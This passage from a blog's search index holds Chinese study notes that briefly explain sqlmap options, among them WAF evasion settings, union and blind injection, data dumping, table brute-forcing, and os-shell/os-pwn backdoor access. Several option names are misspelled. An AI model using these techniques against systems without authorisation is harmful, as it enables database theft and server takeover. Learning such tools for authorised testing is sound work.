class="line-numbers language-none"><code class="language-none">设置每个HTTP请求延迟<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–timeout-TIMEOUT"><a href="#–timeout-TIMEOUT" class="headerlink" title="–timeout=TIMEOUT"></a>–timeout=TIMEOUT</h4><pre class="line-numbers language-none"><code class="language-none">设置超时时间,默认30s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–retires-RETIRES"><a href="#–retires-RETIRES" class="headerlink" title="–retires=RETIRES"></a>–retires=RETIRES</h4><pre class="line-numbers language-none"><code class="language-none">设置重试次数，默认3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–randomize-RPARAM"><a href="#–randomize-RPARAM" class="headerlink" title="–randomize=RPARAM"></a>–randomize=RPARAM</h4><pre class="line-numbers language-none"><code class="language-none">随机地更改给定参数的值 sqlmap -u xxx.com?id&#x3D;1 -- randommize&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–safe-url-SAFEURL"><a href="#–safe-url-SAFEURL" class="headerlink" title="–safe-url=SAFEURL"></a>–safe-url=SAFEURL</h4><pre class="line-numbers language-none"><code class="language-none">有些Web应用程序会在你多次错误访问的请求后，会屏蔽你所有的请求，这里提供一个安全不错误的连接，每隔一段时间请求<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–safe-post-SAFEP"><a href="#–safe-post-SAFEP" class="headerlink" title="–safe-post=SAFEP"></a>–safe-post=SAFEP</h4><pre class="line-numbers language-none"><code class="language-none">设置一个正确的POST数据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–safe-freq-SAFER"><a href="#–safe-freq-SAFER" class="headerlink" title="–safe=freq=SAFER"></a>–safe=freq=SAFER</h4><pre class="line-numbers language-none"><code class="language-none">设置访问安全url时间的时间间隔.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–safe-req-SAFER"><a href="#–safe-req-SAFER" class="headerlink" title="–safe-req=SAFER"></a>–safe-req=SAFER</h4><pre class="line-numbers language-none"><code class="language-none">从文件中读取安全,或者说正确http请求。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–skip-urlencode"><a href="#–skip-urlencode" class="headerlink" title="–skip-urlencode"></a>–skip-urlencode</h4><pre class="line-numbers language-none"><code class="language-none">不进行url编码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="force-ssl"><a href="#force-ssl" class="headerlink" title="force-ssl"></a>force-ssl</h4><pre class="line-numbers language-none"><code class="language-none">强迫使用SSL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–hpp"><a href="#–hpp" class="headerlink" title="–hpp"></a>–hpp</h4><pre class="line-numbers language-none"><code class="language-none">参数污染 ?id&#x3D;cmd&amp;id&#x3D;aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="eval-EVAL"><a href="#eval-EVAL" class="headerlink" title="-eval=EVAL"></a>-eval=EVAL</h4><pre class="line-numbers language-none"><code class="language-none">执行一些代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SQLMAP优化注入"><a href="#SQLMAP优化注入" class="headerlink" title="SQLMAP优化注入"></a>SQLMAP优化注入</h3><h4 id="o"><a href="#o" class="headerlink" title="-o"></a>-o</h4><pre class="line-numbers language-none"><code class="language-none">开启所有优化<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–keep-alive"><a href="#–keep-alive" class="headerlink" title="–keep-alive"></a>–keep-alive</h4><pre class="line-numbers language-none"><code class="language-none">与--proxy不兼容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–null-connection"><a href="#–null-connection" class="headerlink" title="–null-connection"></a>–null-connection</h4><pre class="line-numbers language-none"><code class="language-none">直接获得回复的body的大小，而不用获得内容。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–tread"><a href="#–tread" class="headerlink" title="–tread"></a>–tread</h4><pre class="line-numbers language-none"><code class="language-none">多线程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h3><h4 id="p-TESTPARAMETER"><a href="#p-TESTPARAMETER" class="headerlink" title="-p TESTPARAMETER"></a>-p TESTPARAMETER</h4><pre class="line-numbers language-none"><code class="language-none">设定测试的参数。sqlmap默认测试所有的GET与POST参数，当--level的值大于等于2时也会测试HTTP的cookie值，大于等于三时也会测试USER-Agent和HTTP的Referer头<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="–skip-SKIP"><a href="#–skip-SKIP" class="headerlink" title="–skip=SKIP"></a>–skip=SKIP</h4><pre class="line-numbers language-none"><code class="language-none">跳过一些参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–skip-static"><a href="#–skip-static" class="headerlink" title="–skip-static"></a>–skip-static</h4><pre class="line-numbers language-none"><code class="language-none">跳过一些静态的数据类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–dbms-DBMS"><a href="#–dbms-DBMS" class="headerlink" title="–dbms=DBMS"></a>–dbms=DBMS</h4><pre class="line-numbers language-none"><code class="language-none">指定数据库类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–os-OS"><a href="#–os-OS" class="headerlink" title="–os=OS"></a>–os=OS</h4><pre class="line-numbers language-none"><code class="language-none">指定一些操作系统<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–dbms-cred-DBMS"><a href="#–dbms-cred-DBMS" class="headerlink" title="–dbms-cred=DBMS"></a>–dbms-cred=DBMS</h4><pre class="line-numbers language-none"><code class="language-none">获得数据库认证信息(user:password)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–invalid-bignum"><a href="#–invalid-bignum" class="headerlink" title="–invalid-bignum"></a>–invalid-bignum</h4><pre class="line-numbers language-none"><code class="language-none">注入参数形式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–no-escape"><a href="#–no-escape" class="headerlink" title="–no-escape"></a>–no-escape</h4><pre class="line-numbers language-none"><code class="language-none">将字符串变为char(ascii)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–prefix-–suffix"><a href="#–prefix-–suffix" class="headerlink" title="–prefix, –suffix"></a>–prefix, –suffix</h4><pre class="line-numbers language-none"><code class="language-none">选择参数&#39;,&#39;)之类的闭合方式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="tamper"><a href="#tamper" class="headerlink" title="-tamper"></a>-tamper</h4><h3 id="探测注入"><a href="#探测注入" class="headerlink" title="探测注入"></a>探测注入</h3><h4 id="–level-LEVEL"><a href="#–level-LEVEL" class="headerlink" title="–level=LEVEL"></a>–level=LEVEL</h4><pre class="line-numbers language-none"><code class="language-none">探测的级别<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–risk-RISK"><a href="#–risk-RISK" class="headerlink" title="–risk=RISK"></a>–risk=RISK</h4><pre class="line-numbers language-none"><code class="language-none">探测的级别<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–string-STRINg"><a href="#–string-STRINg" class="headerlink" title="–string=STRINg"></a>–string=STRINg</h4><pre class="line-numbers language-none"><code class="language-none">设置返回页面中的字符，页面返回这个字符，说明我们的注入判断语句是正确的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–not-string-STRINg"><a href="#–not-string-STRINg" class="headerlink" title="–not-string=STRINg"></a>–not-string=STRINg</h4><pre class="line-numbers language-none"><code class="language-none">设置返回页面中的字符，页面没有返回这个字符，说明我们的注入判断语句是错误的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–regexp-REGEXP"><a href="#–regexp-REGEXP" class="headerlink" title="–regexp=REGEXP"></a>–regexp=REGEXP</h4><pre class="line-numbers language-none"><code class="language-none">用正则告诉sqlmap返回什么是正确的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–code-CODE"><a href="#–code-CODE" class="headerlink" title="–code=CODE"></a>–code=CODE</h4><pre class="line-numbers language-none"><code class="language-none">用http响应码来判断注入语句是正确的,列如相应200时为真,相应401时为加。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–text-only"><a href="#–text-only" class="headerlink" title="–text-only"></a>–text-only</h4><pre class="line-numbers language-none"><code class="language-none">判断返回页面是否相同<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–titles"><a href="#–titles" class="headerlink" title="–titles"></a>–titles</h4><pre class="line-numbers language-none"><code class="language-none">真条件下的返回页面的标题与假条件下返回页面呃标题<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h3><h4 id="–time-sec-TIMESEC"><a href="#–time-sec-TIMESEC" class="headerlink" title="–time-sec=TIMESEC"></a>–time-sec=TIMESEC</h4><pre class="line-numbers language-none"><code class="language-none">基于时间盲注时,设置数据库延迟(默认5s)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–union-clos-UCOLS"><a href="#–union-clos-UCOLS" class="headerlink" title="–union-clos=UCOLS"></a>–union-clos=UCOLS</h4><pre class="line-numbers language-none"><code class="language-none">设置联合查询列的数目的范围 10-20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–union-char"><a href="#–union-char" class="headerlink" title="–union-char="></a>–union-char=</h4><pre class="line-numbers language-none"><code class="language-none">设置union查询使用的字符,默认为NULLUnion select NULL,NULL,name from....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="–union-from"><a href="#–union-from" class="headerlink" title="–union-from"></a>–union-from</h4><pre class="line-numbers language-none"><code class="language-none">设置union查询的库<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–dns-domain"><a href="#–dns-domain" class="headerlink" title="–dns-domain"></a>–dns-domain</h4><pre class="line-numbers language-none"><code class="language-none">DNS攻击<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–second-order"><a href="#–second-order" class="headerlink" title="–second-order"></a>–second-order</h4><pre class="line-numbers language-none"><code class="language-none">二次注入<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="f-–fingerprint"><a href="#f-–fingerprint" class="headerlink" title="-f ,–fingerprint"></a>-f ,–fingerprint</h4><pre class="line-numbers language-none"><code class="language-none">指纹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="枚举注入"><a href="#枚举注入" class="headerlink" title="枚举注入"></a>枚举注入</h3><p>首先获得数据库的各种信息已经在上面说过了，这里不再赘述。</p><h4 id="–dump"><a href="#–dump" class="headerlink" title="–dump"></a>–dump</h4><pre class="line-numbers language-none"><code class="language-none">可以用来获得指定数据库,表,列的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–start-–stop"><a href="#–start-–stop" class="headerlink" title="–start, –stop"></a>–start, –stop</h4><pre class="line-numbers language-none"><code class="language-none">指定从第几行输出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="x"><a href="#x" class="headerlink" title="-x"></a>-x</h4><pre class="line-numbers language-none"><code class="language-none">指定不枚举列<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–first-–last"><a href="#–first-–last" class="headerlink" title="–first,–last"></a>–first,–last</h4><pre class="line-numbers language-none"><code class="language-none">用在盲注，指定想看的字符。例如：--first&#x3D;1 --last&#x3D;3 获得前三个字符。pass 变为 pas<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="–sql-query-””"><a href="#–sql-query-””" class="headerlink" title="–sql-query=””"></a>–sql-query=””</h4><pre class="line-numbers language-none"><code class="language-none">指定一个sql语句执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–sql-shell"><a href="#–sql-shell" class="headerlink" title="–sql-shell"></a>–sql-shell</h4><pre class="line-numbers language-none"><code class="language-none">在运行过程中选择sql语句执行。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sql-file"><a href="#sql-file" class="headerlink" title="-sql-file"></a>-sql-file</h4><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><h4 id="–common-tables-columns"><a href="#–common-tables-columns" class="headerlink" title="–common-tables(columns)"></a>–common-tables(columns)</h4><pre class="line-numbers language-none"><code class="language-none">使用爆破来获得表与列。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="shell攻击"><a href="#shell攻击" class="headerlink" title="shell攻击"></a>shell攻击</h3><h4 id="–os-cmd"><a href="#–os-cmd" class="headerlink" title="–os-cmd="></a>–os-cmd=</h4><pre class="line-numbers language-none"><code class="language-none">执行shell命令原理：创造一个php文件里面包含后门代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h4><pre class="line-numbers language-none"><code class="language-none">执行后,可以再选择shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–os-pwn"><a href="#–os-pwn" class="headerlink" title="–os-pwn"></a>–os-pwn</h4><pre class="line-numbers language-none"><code class="language-none">获得权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="–msf-path-”指定目录”"><a href="#–msf-path-”指定目录”" class="headerlink" title="–msf-path=”指定目录”"></a>–msf-path=”指定目录”</h4><pre class="line-numbers language-none"><code class="language-none">指定文件创造的目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SQLSever"><a href="#SQLSever" class="headerlink" title="SQLSever"></a>SQLSever</h2><p>  1.语法与MySQL不同<br>    1. select * from student;(相同)<br>    2. 没有show databases;</p><h2 id="Oracle语法"><a href="#Oracle语法" class="headerlink" title="Oracle语法"></a>Oracle语法</h2><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h2 id="拦截方式"><a href="#拦截方式" class="headerlink" title="拦截方式"></a>拦截方式</h2>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>article title</title>
      <link href="/2021/08/30/article-title/"/>
      <url>/2021/08/30/article-title/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
